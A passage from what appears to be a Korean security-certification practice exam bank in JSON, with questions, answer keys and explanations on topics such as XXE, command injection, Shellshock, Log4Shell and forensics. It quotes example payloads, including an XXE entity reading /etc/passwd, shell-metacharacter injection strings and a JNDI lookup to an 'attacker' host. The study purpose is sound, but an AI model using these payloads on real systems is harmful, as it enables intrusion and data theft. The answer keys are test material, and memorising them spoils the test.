쓰시오.","scenario":"","answer":"**(1)** SHA-512\n**(2)** 솔트(Salt) — **레인보우 테이블 공격** 방어","explanation":"shadow 암호 필드는 `$해시함수$솔트$해시값` 구조다. `$1`=MD5, `$5`=SHA-256, `$6`=SHA-512. 솔트를 해시 입력에 추가하면 동일한 암호라도 해시값이 달라져, 미리 계산된 해시 목록(레인보우 테이블)으로 대조하는 공격이 무력화된다."},{"num":2,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음 PAM 설정의 의미를 보고 물음에 답하시오.\n\n`auth required pam_tally2.so deny=5 unlock_time=120 no_magic_root`\n\n(1) `deny=5`의 의미를 쓰시오.\n(2) `unlock_time=120`의 의미를 쓰시오.","scenario":"","answer":"**(1)** 인증(로그인) **5회 실패 시 계정을 잠금**한다.\n**(2)** 마지막 인증 실패 시점부터 **120초 후 자동으로 잠금을 해제**한다.","explanation":"pam_tally2/pam_faillock는 계정 잠금 임계값을 설정하는 모듈이다. `deny`는 잠금 실패 횟수, `unlock_time`은 자동 해제 시간(초), `no_magic_root`는 root 예외, `reset`은 성공 시 실패 횟수 초기화를 의미한다."},{"num":3,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 공격 및 관련 용어를 쓰시오.\n\n공격자가 자신의 NIC(랜카드)를 본래 목적지가 아닌 패킷까지 모두 수신하는 상태로 설정하여, 네트워크를 지나는 패킷을 도청한다. 시스템 로그에 `device eth0 entered ( ① ) mode`가 남는다.\n\n(1) 이 공격의 명칭을 쓰시오.\n(2) ①에 들어갈 NIC 동작 모드를 쓰시오.","scenario":"","answer":"**(1)** 스니핑(Sniffing)\n**(2)** 무차별 모드(Promiscuous Mode)","explanation":"스니핑은 NIC를 무차별 모드(Promiscuous)로 설정해 자신에게 오지 않는 패킷까지 수신하는 도청 공격이다. 탐지는 Ping/ARP 위장 응답 여부 확인, 대응은 SSH·HTTPS 등 암호화 통신과 스위치 환경 운용이 핵심이다."},{"num":4,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 두 공격이 무엇인지 각각 쓰시오.\n\n( ① ) : HTTP 헤더의 CRLF(개행) 필드를 조작하여 **미완성 헤더**를 조금씩 지속 전송함으로써 연결을 오래 유지시켜 서버 자원을 고갈시킨다.\n( ② ) : POST 요청의 Content-Length를 매우 크게 설정한 뒤, 본문(body)을 **1바이트씩 분할 전송**하여 서버가 데이터 도착까지 대기하게 만든다.","scenario":"","answer":"**①** Slowloris (Slow HTTP Header)\n**②** RUDY (R-U-Dead-Yet, Slow HTTP POST)","explanation":"둘 다 소량의 트래픽으로 연결을 오래 점유하는 Slow HTTP DoS 계열이다. Slowloris는 미완성 헤더 지속 전송, RUDY는 큰 Content-Length + body 분할 전송, Slow Read는 TCP 윈도우를 작게 설정한다. 공통 대응은 연결·읽기 타임아웃과 동일 IP 동시 연결 수 제한이다."},{"num":5,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 포트 스캔 기법을 쓰시오.\n\n대상 포트에 ACK 플래그만 설정한 패킷을 보낸다. 목적은 포트의 Open 여부 판별이 아니라 **방화벽의 필터링(룰셋) 적용 여부**를 판별하는 것이다. RST 응답이 오면 필터링되지 않은 것, 무응답이거나 ICMP 오류가 오면 필터링된 것으로 판단한다.","scenario":"","answer":"TCP ACK 스캔 (ACK Scan)","explanation":"ACK 스캔은 포트 Open/Close가 아니라 방화벽 필터링 여부를 판별하는 스캔이다. 비상태형(stateless) 방화벽은 ACK 패킷을 통과시켜 RST가 돌아오고, 필터링되면 무응답·ICMP가 온다. '포트 개방 여부 판별'이라고 쓰면 감점되니 목적을 정확히 서술해야 한다."},{"num":6,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 설명에 해당하는 공격과 대응 헤더를 쓰시오.\n\n공격자가 **투명한 `iframe`**을 정상 웹 페이지 위에 겹쳐 놓아, 사용자가 보이는 버튼을 누르는 것으로 착각하게 만들고 실제로는 숨겨진 다른 버튼·링크를 클릭하게 유도한다(UI Redressing).\n\n(1) 이 공격의 명칭을 쓰시오.\n(2) 이를 방어하는 대표적인 HTTP 응답 헤더 1가지를 쓰시오.","scenario":"","answer":"**(1)** 클릭재킹(Clickjacking)\n**(2)** X-Frame-Options (DENY 또는 SAMEORIGIN)","explanation":"클릭재킹은 투명 iframe으로 클릭을 가로채는 공격이다. 대응은 X-Frame-Options 헤더(DENY/SAMEORIGIN), CSP의 `frame-ancestors` 지시자, 프레임버스팅 스크립트가 있다."},{"num":7,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 XML 문서가 유발하는 취약점의 명칭을 쓰시오.\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>&xxe;<\/foo>\n```\n\n(위와 같이 외부 엔티티를 참조하도록 조작하여 서버의 시스템 파일을 읽거나 SSRF·DoS를 유발하는 취약점)","scenario":"","answer":"XXE (XML External Entity, XML 외부 개체 주입)","explanation":"XXE는 XML 파서가 외부 엔티티 참조를 허용할 때 발생한다. `file://`로 시스템 파일을 읽는 정보 노출과, 엔티티를 재귀 참조하는 Billion Laughs(DoS) 유형이 있다. 대응은 외부 엔티티·DTD 처리 비활성화다."},{"num":8,"type":"단답형","points":3,"domain":"정보보안 일반","question":"이메일 발신자 위조를 방지하는 인증 기술에 대해 각각의 명칭을 쓰시오.\n\n( ① ) : 발신 도메인의 DNS에 **허용 IP를 TXT 레코드**로 등록해 두고, 실제 발신 서버의 IP와 대조하여 위조를 검증한다.\n( ② ) : 발신 서버가 **개인키로 메일 헤더에 전자서명**하고, 수신 서버가 DNS에 공개된 **공개키**로 검증하여 위·변조 여부를 확인한다.","scenario":"","answer":"**①** SPF (Sender Policy Framework)\n**②** DKIM (DomainKeys Identified Mail)","explanation":"SPF는 DNS TXT에 등록된 허용 IP로 발신 IP를 검증하고, DKIM은 개인키 서명/공개키 검증으로 무결성을 확인한다. DMARC는 SPF+DKIM 결과를 결합해 실패 시 처리 정책(none/quarantine/reject)과 리포팅을 규정한다."},{"num":9,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음은 록히드 마틴의 사이버 킬 체인(Cyber Kill Chain) 7단계이다. 빈칸 ①②에 들어갈 단계를 쓰시오.\n\n정찰 → 무기화 → 전달 → 익스플로잇(취약점 공격) → ( ① ) → ( ② ) → 목표 달성","scenario":"","answer":"**①** 설치(Installation)\n**②** 명령·제어(C2, Command & Control)","explanation":"사이버 킬 체인 7단계는 정찰 → 무기화 → 전달 → 익스플로잇 → 설치 → 명령·제어(C2) → 목표 달성(행동)이다. MITRE ATT&CK은 이를 확장해 공격 전술·기법을 14단계로 체계화한 모델이다."},{"num":10,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"위험 처리(대응) 방식에 대한 다음 설명이 각각 어떤 방식인지 쓰시오.\n\n( ① ) : 위험으로 인한 경제적 손실·책임을 **제3자에게 이전**한다. (예: 보험 가입, 외주 위탁)\n( ② ) : 위험이 존재하는 프로세스·사업 자체를 **축소하거나 포기**한다.","scenario":"","answer":"**①** 위험 전가(Risk Transfer)\n**②** 위험 회피(Risk Avoidance)","explanation":"위험 처리 4방식은 수용(그대로 유지)·완화(감소, 대책 구현)·전가(보험·외주로 이전)·회피(사업 축소·포기)다. 보험 가입이 대표적인 전가 사례라는 점이 자주 출제된다."},{"num":11,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"「개인정보의 안전성 확보조치 기준」상 개인정보처리시스템의 **접속기록 보관 기간**에 관한 다음 빈칸을 채우시오.\n\n- 원칙 : 접속기록을 최소 ( ① ) 이상 보관·관리해야 한다.\n- 예외 : 5만 명 이상의 정보주체를 처리하거나 고유식별정보·민감정보를 처리하는 시스템은 ( ② ) 이상 보관해야 한다.","scenario":"","answer":"**①** 1년\n**②** 2년","explanation":"접속기록은 원칙적으로 1년 이상, 5만 명 이상 정보주체 처리 또는 고유식별정보·민감정보 처리 시스템은 2년 이상 보관해야 한다. 또한 접속기록은 월 1회 이상 점검해야 한다."},{"num":12,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"국가 사이버 위기 경보 단계는 5단계로 구분된다. 낮은 단계부터 높은 단계 순으로 빈칸 ①②를 채우시오.\n\n정상 → 관심 → ( ① ) → ( ② ) → 심각","scenario":"","answer":"**①** 주의\n**②** 경계","explanation":"사이버 위기 경보 5단계는 낮은 순서로 정상 → 관심 → 주의 → 경계 → 심각이다. 위협 수준이 올라갈수록 단계가 상향된다."},{"num":13,"type":"서술형","points":12,"domain":"네트워크 보안","question":"SSL/TLS 핸드셰이크 과정에서 사용되는 암호화 방식에 대하여 다음 물음에 답하시오.\n\n(1) 핸드셰이크 과정에서 **비대칭키(공개키) 암호화**가 사용되는 지점과 그 용도를 서술하시오. (4점)\n(2) 실제 데이터 전송 시 **대칭키(세션 키) 암호화**를 사용하는 이유를 서술하시오. (4점)\n(3) 클라이언트가 세션 키를 안전하게 서버와 공유하는 과정을 서술하시오. (4점)","scenario":"","answer":"**(1) 비대칭키 사용 지점**\n- 서버가 인증서(Server Certificate)로 **서버 공개키**를 전달하면, 클라이언트는 자신이 생성한 암호키(pre-master secret)를 **서버의 공개키로 암호화**하여 전달한다. 즉 **세션 키 교환(키 분배)**에 비대칭키를 사용한다.\n\n**(2) 대칭키 사용 이유**\n- 비대칭키 연산은 속도가 느리므로, 핸드셰이크가 끝난 뒤 대량의 실제 데이터는 연산이 빠른 **대칭키(세션 키)로 암호화**하여 성능을 확보한다.\n\n**(3) 세션 키 공유 과정**\n- 클라이언트가 pre-master secret을 생성 → **서버 공개키로 암호화**하여 전송 → 서버는 자신의 **개인키로 복호화** → 양쪽이 동일한 값으로 **세션 키(대칭키)를 각각 생성** → 이후 데이터를 세션 키로 암호화하여 송수신한다.","explanation":"SSL/TLS는 '키 교환은 비대칭키, 데이터 암호화는 대칭키'라는 하이브리드 구조가 핵심이다. 비대칭키는 서버 공개키로 세션 키를 안전하게 전달(키 분배)하는 데 쓰고, 실제 데이터는 속도가 빠른 대칭키로 암호화한다는 점을 반드시 써야 한다."},{"num":14,"type":"서술형","points":12,"domain":"애플리케이션·웹 보안","question":"운영체제 명령어 삽입(OS Command Injection) 공격에 대하여 다음 물음에 답하시오.\n\n(1) 공격의 개념(발생 원리)을 서술하시오. (4점)\n(2) 아래 코드가 취약한 이유를 서술하시오. (4점)\n(3) 대응방안을 2가지 이상 서술하시오. (4점)","scenario":"```\n// 사용자가 입력한 host 값으로 ping 실행\nString host = request.getParameter(\"host\");\nRuntime.getRuntime().exec(\"ping -c 3 \" + host);\n```","answer":"**(1) 개념**\n- 검증되지 않은 사용자 입력이 **OS 명령어의 일부로 전달**되어, 공격자가 의도하지 않은 시스템 명령을 실행하게 만드는 취약점이다.\n\n**(2) 취약한 이유**\n- 사용자 입력 `host`를 검증 없이 명령 문자열에 그대로 결합한다. 공격자가 `127.0.0.1; cat /etc/passwd` 또는 `127.0.0.1 | id` 처럼 **셸 메타문자(`; | & $` 등)**를 넣으면, 뒤에 붙은 명령까지 함께 실행된다.\n\n**(3) 대응방안**\n- 입력값 **화이트리스트 검증**(허용된 문자·형식만 통과)\n- 셸 메타문자(`; | & $ \\` 등) 필터링·이스케이프\n- 셸을 거치지 않는 **API로 인자 분리 전달**(예: 명령·인자 배열 실행), 최소권한으로 실행","explanation":"OS 커맨드 인젝션은 사용자 입력을 명령 문자열에 그대로 결합할 때 셸 메타문자로 추가 명령이 실행되는 취약점이다. 핵심 대응은 화이트리스트 검증, 메타문자 차단, 셸을 거치지 않는 인자 분리 실행이다."},{"num":15,"type":"서술형","points":12,"domain":"정보보안 일반","question":"디지털 포렌식(Digital Forensic)에 대하여 다음 물음에 답하시오.\n\n(1) 디지털 포렌식의 개념을 서술하시오. (3점)\n(2) 디지털 포렌식의 5대 원칙을 쓰고 각각을 간단히 설명하시오. (6점)\n(3) 증거의 위·변조가 없었음을 증명하기 위해 사용하는 대표적 기법을 서술하시오. (3점)","scenario":"","answer":"**(1) 개념**\n- 디지털 매체와 관련된 범죄의 **법적 증거를 확보**하기 위해 데이터를 수집·분석·보존하는 절차·기술이다.\n\n**(2) 5대 원칙**\n- **정당성** : 적법한 절차로 수집된 증거여야 한다(위법 수집 증거는 효력 없음).\n- **재현성** : 동일 조건에서 동일한 결과가 나와야 한다.\n- **신속성** : 휘발성 정보 확보를 위해 신속히 대응한다.\n- **연계보관성(Chain of Custody)** : 수집→이송→분석→보관→제출 각 단계의 담당자·책임을 명확히 한다.\n- **무결성** : 수집한 증거가 위·변조되지 않고 원본과 동일함을 보장한다.\n\n**(3) 무결성 증명 기법**\n- 수집 시점과 분석·제출 시점의 **해시값(MD5/SHA 등)을 비교**하여 값이 일치함을 보여 원본과 동일함(위·변조 없음)을 증명한다.","explanation":"디지털 포렌식 5대 원칙은 '정당성·재현성·신속성·연계보관성·무결성(정재신연무)'이다. 무결성은 해시값 비교로 증명하고, 연계보관성은 증거 이동·보관 단계별 책임 추적을 의미한다는 점이 채점 포인트다."},{"num":16,"type":"서술형","points":12,"domain":"정보보안 관리 및 법규","question":"생체인식정보 보호에 관한 다음 물음에 답하시오.\n\n(1) 생체인식정보가 일반 개인정보보다 더 강하게 보호되어야 하는 이유를 서술하시오. (4점)\n(2) 생체인식정보 보호 6대 원칙 중 4가지를 쓰고 각각을 간단히 설명하시오. (8점)","scenario":"","answer":"**(1) 강하게 보호해야 하는 이유**\n- 생체정보(지문·홍채·얼굴 등)는 개인마다 고유하고 **변경이 불가능**하다. 한 번 유출되면 비밀번호처럼 바꿀 수 없어 **영구적 피해**로 이어지고, 도용 시 본인 인증 체계 전체가 무력화될 수 있다.\n\n**(2) 6대 원칙 중 4가지**\n- **비례성** : 처리에 따른 편익 대비 침해 위험이 크지 않은지 고려하여 활용 여부를 판단한다.\n- **적법성** : 수집·이용·제공 등 처리의 근거가 적법·명확해야 한다.\n- **목적제한** : 동의받은 인증·식별 외의 목적으로 무단 활용을 금지한다.\n- **안전성** : 분실·도난·유출·위·변조·훼손되지 않도록 안전하게 처리·관리한다.\n- (그 외: **투명성** — 알기 쉽게 공개, **통제권 보장** — 정보주체 스스로 통제할 수단 제공)","explanation":"생체인식정보는 고유·불변이라 유출 시 변경이 불가능해 강하게 보호해야 한다. 6대 원칙은 비례성·적법성·목적제한·투명성·안전성·통제권 보장이며, 이 중 4가지를 정확히 설명하면 된다."},{"num":17,"type":"실무형","points":16,"domain":"시스템 보안 (침해사고 분석 — /proc)","question":"침해사고가 의심되는 리눅스 서버에서 특정 프로세스(PID 4521)를 조사한 결과가 아래와 같다. 물음에 답하시오.","scenario":"```\n# ls -al /proc/4521\n...\nlrwxrwxrwx 1 root root 0 exe -> /tmp/.hidden/backdoor (deleted)\nlrwxrwxrwx 1 root root 0 cwd -> /tmp/.hidden\n-r-------- 1 root root 0 cmdline\n...\n# ls -al /tmp/.hidden/backdoor\nls: cannot access '/tmp/.hidden/backdoor': No such file or directory\n```","answer":"**(1) 실행 파일이 보이지 않는 이유** (5점)\n- 공격자가 백도어 **프로세스를 실행한 뒤 원본 실행 파일을 삭제**했기 때문이다(경로에 `(deleted)` 표시). 파일은 디스크에서 삭제되었지만 **프로세스는 메모리에서 계속 실행 중**이라, 프로세스 정보(`/proc/4521`)는 남아 있다.\n\n**(2) 삭제된 백도어 실행 파일을 복원하는 방법** (5점)\n- `/proc/[PID]/exe`는 실행 중 파일의 이미지를 가리키므로 이를 복사하여 복원한다.\n  ```\n  cp /proc/4521/exe /tmp/recovered_backdoor\n  ```\n\n**(3) `ps`가 변조되어 사용 불가할 때, 공격자가 실행한 명령·인자를 확인하는 방법** (6점)\n- `cat /proc/4521/cmdline` : 프로세스 실행 시 사용한 **명령어와 인자**를 확인한다.\n- `history` 명령으로 로그인 후 입력한 명령을 확인한다(단, history가 삭제되었으면 cmdline을 참조).\n- ※ `lsof`는 열린 파일 확인은 되지만 입력 명령어 확인은 불가하다.","explanation":"`exe -> ... (deleted)`는 '실행 후 파일 삭제' 백도어의 전형이다. 프로세스가 메모리에 살아 있으므로 `/proc/[PID]/exe`를 cp로 복원하고, `/proc/[PID]/cmdline`으로 실행 명령·인자를 확인한다. lsof는 명령어 확인 용도가 아니라는 점이 함정으로 자주 나온다."},{"num":18,"type":"실무형","points":16,"domain":"정보보안 관리 및 법규 (정량적 위험평가)","question":"어느 조직이 자산과 위험, 도입 검토 중인 두 가지 정보보호 대책의 정보가 아래와 같다. 물음에 답하시오. (SLE = AV × EF, ALE = SLE × ARO)","scenario":"```\n[자산 정보]\n 자산가치(AV)     : 100,000,000원\n 노출계수(EF)     : 0.4\n 연간발생률(ARO)  : 0.5\n\n[대책 비교]\n 대책 A : 적용 후 연간 손실(ALE) 8,000,000원 / 연간 운영비 5,000,000원\n 대책 B : 적용 후 연간 손실(ALE) 5,000,000원 / 연간 운영비 9,000,000원\n```","answer":"**(1) 현재(대책 미적용) SLE와 ALE를 계산하시오.** (6점)\n- SLE = AV × EF = 100,000,000 × 0.4 = **40,000,000원**\n- ALE = SLE × ARO = 40,000,000 × 0.5 = **20,000,000원**\n\n**(2) 각 대책의 효과(가치)를 계산하시오.** (6점)\n- 대책 효과 = (감소한 ALE) − (연간 운영비) = (적용 전 ALE − 적용 후 ALE) − 운영비\n- **대책 A** : (20,000,000 − 8,000,000) − 5,000,000 = 12,000,000 − 5,000,000 = **7,000,000원**\n- **대책 B** : (20,000,000 − 5,000,000) − 9,000,000 = 15,000,000 − 9,000,000 = **6,000,000원**\n\n**(3) 어느 대책을 선정해야 하는지와 그 근거를 서술하시오.** (4점)\n- **대책 A를 선정한다.** 대책의 효과(감소 ALE − 운영비) 값이 A는 700만 원, B는 600만 원으로 **A가 더 크므로** 비용 대비 위험 감소 효과가 우수하다.","explanation":"SLE=AV×EF, ALE=SLE×ARO 공식을 정확히 적용해야 한다. 대책 선정은 '감소한 ALE − 대책 운영비'가 가장 큰 것을 고르며, 적용 후 ALE가 더 낮은 대책(B)이라도 운영비가 크면 효과 값이 낮아질 수 있다는 점이 핵심이다."}]},{"round":6,"title":"제6회 예상문제","subtitle":"단답형 12 · 서술형 4 · 실무형 2(택1) · 총 100점 · 180분","questions":[{"num":1,"type":"단답형","points":3,"domain":"시스템 보안","question":"윈도우 서버의 로그 경로에 관한 다음 설명에 해당하는 로그 이름을 각각 쓰시오.\n\n( ① ) : IIS 웹 서버의 HTTP 프로토콜 수준 오류(요청 실패 등)를 기록한다. (경로: `%SystemRoot%\\System32\\LogFiles\\HTTPERR\\`)\n( ② ) : DHCP 서버의 IP 주소 할당·임대 관련 로그를 기록한다. (경로: `%SystemRoot%\\System32\\dhcp\\`)","scenario":"","answer":"**①** HTTPERR 로그\n**②** DHCP 로그","explanation":"HTTPERR는 IIS의 HTTP 프로토콜 오류를, DHCP 로그는 IP 할당·임대 내역을 기록한다. 경로(LogFiles\\HTTPERR, System32\\dhcp)까지 함께 묻는 경우가 많다."},{"num":2,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음 설명에 해당하는 취약점의 명칭을 쓰시오.\n\nBash 셸에서 환경변수에 **함수를 정의할 때, 함수 정의 뒤에 붙인 명령까지 실행**되는 취약점이다. `env x='() { :; }; [악성명령]' bash -c \"echo test\"` 형태로 악용되며, CGI 등을 통해 원격 명령 실행으로 이어질 수 있다.","scenario":"","answer":"셸쇼크(Shellshock, Bash 환경변수 취약점)","explanation":"셸쇼크는 Bash가 환경변수에 담긴 함수 정의 뒤의 명령까지 실행하는 취약점(CVE-2014-6271)이다. 웹 서버 CGI를 통해 웹셸 생성·원격 명령 실행으로 확대될 수 있어 Bash 패치가 필수다."},{"num":3,"type":"단답형","points":3,"domain":"네트워크 보안","question":"VPN 터널링 프로토콜에 관한 다음 설명에서 각 프로토콜의 명칭을 쓰시오.\n\n( ① ) : L2F와 PPTP를 결합한 2계층(데이터링크) 터널링 프로토콜이다.\n( ② ) : OSI **3계층(네트워크 계층)**에서 기밀성·무결성·인증을 제공하는 표준 프로토콜로, AH와 ESP 프로토콜을 사용한다.","scenario":"","answer":"**①** L2TP (Layer 2 Tunneling Protocol)\n**②** IPSec (IP Security)","explanation":"L2TP는 L2F+PPTP를 결합한 2계층 터널링, IPSec은 3계층 표준 보안 프로토콜이다. IPSec은 인증만 제공하는 AH와 인증+암호화를 제공하는 ESP를 사용하며, 전송 모드/터널 모드로 동작한다."},{"num":4,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 악성코드 기법을 쓰시오.\n\n악성코드가 **특정 알고리즘(규칙)으로 C&C(명령·제어) 서버의 도메인명을 대량으로 자동 생성·변경**한다. 이를 통해 고정된 도메인·IP를 차단하는 평판(Reputation) 기반 탐지를 우회한다.","scenario":"","answer":"DGA (Domain Generation Algorithm, 도메인 생성 알고리즘)","explanation":"DGA는 시드·날짜 등을 입력으로 다수의 C&C 도메인을 자동 생성해 블랙리스트·평판 기반 차단을 회피한다. 유사 도메인 악용 기법으로 서브도메인 테이크오버, Domain Shadowing도 함께 알아두면 좋다."},{"num":5,"type":"단답형","points":3,"domain":"네트워크 보안","question":"SNMP 보안 설정에 관한 다음 빈칸을 채우시오.\n\n- 인증·암호화를 지원하는 ( ① ) 버전을 사용하도록 권고한다.\n- Community String을 유추하기 어려운 값으로 설정하고, 조회만 필요한 경우 권한을 ( ② )(으)로 제한한다.","scenario":"","answer":"**①** SNMPv3\n**②** 읽기 전용(RO, Read Only)","explanation":"SNMP는 인증·암호화를 지원하는 v3 사용을 권고한다. Community String을 추측 어렵게 설정하고, 조회만 필요하면 RO(Read Only)로 제한하며, ACL로 접근 IP를 통제하는 것이 기본 보안 설정이다."},{"num":6,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"아파치 웹 서버 설정에 관한 다음 설명에서 물음에 답하시오.\n\n디렉터리에 index 파일이 없을 때 파일·디렉터리 목록이 그대로 브라우저에 노출되는 취약점이 있다.\n\n(1) 이 취약점의 명칭을 쓰시오.\n(2) 이 노출을 유발하는 `Options` 지시자의 옵션 값을 쓰고, 제거(비활성화) 표기를 쓰시오.","scenario":"","answer":"**(1)** 디렉터리 인덱싱(Directory Indexing / 디렉터리 리스팅)\n**(2)** `Indexes` 옵션 때문에 발생 → `Options -Indexes`로 제거(비활성화)","explanation":"디렉터리 인덱싱은 index 파일이 없을 때 Options의 Indexes 설정으로 파일 목록이 노출되는 취약점이다. `Options -Indexes`로 제거하고, 심볼릭 링크 접근을 막으려면 `-FollowSymLinks`도 함께 설정한다."},{"num":7,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 설명에 해당하는 취약점의 명칭과, 악용에 사용되는 자바 기술을 쓰시오.\n\n아파치의 자바 기반 로깅 라이브러리에서, 로그로 남기는 문자열에 `${jndi:ldap://attacker/exploit}` 형태를 삽입하면 라이브러리가 외부 서버를 조회하여 악성 클래스를 내려받아 실행(RCE)한다(CVE-2021-44228, CVSS 10.0).\n\n(1) 취약점(라이브러리) 명칭을 쓰시오.\n(2) 악용에 사용되는 자바 기술을 쓰시오.","scenario":"","answer":"**(1)** Log4j 취약점 (Log4Shell)\n**(2)** JNDI (Java Naming and Directory Interface) — LDAP 조회 이용","explanation":"Log4Shell(CVE-2021-44228)은 Log4j가 로그 문자열의 `${jndi:...}`를 조회(lookup)하면서 외부에서 악성 클래스를 실행하는 RCE 취약점이다. 대응은 Log4j 2.17.1 이상 업그레이드, `formatMsgNoLookups=true`, 아웃바운드 LDAP/RMI 차단이다."},{"num":8,"type":"단답형","points":3,"domain":"정보보안 일반","question":"국내에서 개발된 대칭키 블록 암호 알고리즘에 관한 다음 설명에서 각 알고리즘 명칭을 쓰시오.\n\n( ① ) : 한국 KISA가 개발한 128bit 블록 암호 알고리즘이다.\n( ② ) : RFID·IoT 등 **경량 환경**을 위해 개발된 국산 64bit 블록 암호 알고리즘이다.","scenario":"","answer":"**①** SEED\n**②** HIGHT","explanation":"국산 대칭키로 SEED(KISA, 128bit), ARIA(국정원·학계 공동, 128bit 국가표준), HIGHT(경량 IoT용 64bit)가 있다. AES는 국제표준(Rijndael)이며 국산이 아니라는 점에 유의한다."},{"num":9,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 보안 솔루션의 명칭을 쓰시오.\n\n서버 및 보안 시스템에서 발생하는 **대용량 로그를 빅데이터 기법으로 장기간 저장·상관분석**하여, APT 등 지능형 위협을 조기에 탐지·경고하고 포렌식을 지원하는 통합 분석 보안 시스템이다. (실시간 이벤트 관제 중심의 ESM과 구분됨)","scenario":"","answer":"SIEM (Security Information and Event Management)","explanation":"SIEM은 대용량 로그를 장기 저장·상관분석하여 APT 등 지능형 위협을 탐지하고 포렌식을 지원한다. ESM이 실시간 이벤트 관제 중심이라면, SIEM은 빅데이터 기반 장기 로그 상관분석에 중점을 둔다."},{"num":10,"type":"단답형","points":3,"domain":"정보보안 일반","question":"사용자 인증의 3요소에 관한 다음 설명에서 각 요소의 명칭(유형)을 쓰시오.\n\n( ① ) : 사용자가 알고 있는 것 기반 (예: 패스워드, PIN)\n( ② ) : 사용자가 가지고 있는 것 기반 (예: OTP 토큰, 스마트카드, 인증서)","scenario":"","answer":"**①** 지식 기반 (Something you know)\n**②** 소유 기반 (Something you have)","explanation":"인증 3요소는 지식 기반(암호·PIN), 소유 기반(OTP·스마트카드·인증서), 존재/생체 기반(지문·홍채)이다. 서로 다른 2개 이상 요소를 조합하면 다중 인증(MFA)이 된다."},{"num":11,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"재해복구시스템(DRS) 유형에 관한 다음 설명에서 각 유형의 명칭을 쓰시오.\n\n( ① ) : 주 센터와 **동일한 시스템을 원격지에 구축하고 실시간으로 동기화**하여, 재해 시 즉시(거의 0초) 복구가 가능하나 비용이 가장 높다.\n( ② ) : 공간·전원 등 **기반 시설만 확보**하고 데이터·시스템은 재해 발생 시 구축하며, 복구에 수주~수개월이 걸리나 비용이 가장 낮다.","scenario":"","answer":"**①** 미러 사이트(Mirror Site)\n**②** 콜드 사이트(Cold Site)","explanation":"DRS 유형은 복구 속도·비용 순으로 미러(실시간 동기화, 즉시 복구) → 핫(Stand-by, 수시간) → 웜(중요자원만, 수일~수주) → 콜드(기반시설만, 수주~수개월)로 구분된다."},{"num":12,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"침해사고 대응 기관에 관한 다음 설명에서 각 기관의 명칭(약어)을 쓰시오.\n\n( ① ) : 금융·통신 등 **분야별 주요 기반시설**을 보호하기 위해 실시간 경보·분석 체계를 운영하는 정보공유분석센터이다.\n( ② ) : 침해사고의 **사전 예방과 발생 시 조직적·체계적 긴급 대응·복구**를 주 목적으로 하는 침해사고대응팀이다.","scenario":"","answer":"**①** ISAC (정보공유분석센터)\n**②** CERT (침해사고대응팀)","explanation":"ISAC은 분야별 기반시설 보호를 위한 실시간 경보·분석 공유센터, CERT는 침해사고 예방과 긴급 대응·복구를 담당하는 대응팀이다."},{"num":13,"type":"서술형","points":12,"domain":"네트워크 보안","question":"SSL/TLS 관련 취약점에 대하여 다음 물음에 답하시오.\n\n(1) 하트블리드(HeartBleed) 취약점의 개념과 그로 인한 피해를 서술하시오. (6점)\n(2) 푸들(POODLE) 취약점의 개념과 대응 방안을 서술하시오. (6점)","scenario":"","answer":"**(1) HeartBleed**\n- 개념 : OpenSSL의 **Heartbeat 확장 기능** 처리 과정의 경계 검사 오류(버퍼 오버리드) 취약점이다.\n- 피해 : 요청한 것보다 많은 데이터를 반환하게 만들어, 서버 **메모리에 있던 개인키·세션 정보·사용자 계정 등 민감 정보가 유출**된다.\n- 대응 : 취약 OpenSSL 버전 패치, **인증서·개인키 재발급** 및 세션 무효화.\n\n**(2) POODLE**\n- 개념 : 공격자가 TLS 연결을 **SSL 3.0으로 강제 다운그레이드**시킨 뒤, SSL 3.0의 **패딩 오라클 취약점**을 악용해 암호문을 조금씩 해독한다.\n- 대응 : **SSL 3.0 사용을 중지**하고 TLS 1.2 이상만 허용, 다운그레이드 방지(TLS_FALLBACK_SCSV) 적용.","explanation":"HeartBleed는 OpenSSL Heartbeat의 버퍼 오버리드로 메모리(개인키 등)가 유출되는 취약점이고, POODLE은 SSL 3.0 다운그레이드 후 패딩 오라클로 복호화하는 공격이다. HeartBleed는 패치+키 재발급, POODLE은 SSL 3.0 사용 중지가 핵심 대응이다."},{"num":14,"type":"서술형","points":12,"domain":"애플리케이션·웹 보안","question":"XXE(XML External Entity) 취약점에 대하여 다음 물음에 답하시오.\n\n(1) XXE 취약점이 발생하는 근본 원인을 서술하시오. (4점)\n(2) XXE를 이용한 공격 유형 2가지를 원리와 함께 서술하시오. (4점)\n(3) 대응방안을 서술하시오. (4점)","scenario":"","answer":"**(1) 발생 원인**\n- XML 파서가 문서 내의 **외부 엔티티(External Entity) 및 DTD 참조를 허용**하도록 설정되어 있어, 공격자가 조작한 엔티티가 그대로 처리되기 때문이다.\n\n**(2) 공격 유형 2가지**\n- **정보 노출(파일 읽기)** : `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`처럼 외부 엔티티로 **서버의 시스템 파일에 접근**해 내용을 탈취한다(내부망 요청 시 SSRF로도 확장).\n- **DoS (Billion Laughs)** : 엔티티가 다른 엔티티를 **재귀적으로 참조**(lol1→lol2→…)하도록 만들어, 파싱 시 **기하급수적으로 확장**시켜 메모리·CPU 자원을 고갈시킨다.\n\n**(3) 대응방안**\n- XML 파서에서 **외부 엔티티·DTD 처리를 비활성화**한다.\n- 신뢰할 수 없는 XML 입력을 검증하고, 최신 보안 설정의 파서를 사용한다.","explanation":"XXE의 근본 원인은 파서의 외부 엔티티/DTD 처리 